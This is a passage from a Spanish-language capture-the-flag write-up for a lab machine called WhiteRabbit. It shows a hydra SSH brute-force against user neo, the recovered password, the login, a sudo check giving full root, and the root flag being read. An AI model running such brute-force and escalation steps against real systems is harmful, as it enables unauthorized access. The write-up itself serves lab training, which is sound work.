>Usamos hydra para emplear fuerza bruta con la lista de contraseñas por ssh para el usuario neo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ hydra -l neo -P password_list ssh://10.10.11.63 -t 64 -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-20 14:23:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000 login tries (l:1/p:1000), ~16 tries per task
[DATA] attacking ssh://10.10.11.63:22/
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-20 14:23:48
```

>Nos conectamos por ssh como neo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ssh neo@10.10.11.63               
neo@10.10.11.63's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 20 19:24:19 2025 from 10.10.14.226
neo@whiterabbit:~$
```

>Vemos que puede lanzar cualquier comando como root así que ya tendríamos la máquina completa:

```bash
neo@whiterabbit:~$ sudo -l
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
neo@whiterabbit:~$ sudo su
root@whiterabbit:/home/neo# cat /root/root.txt 
dc6d5e3c52a62ab71d36d31c13201c16
```
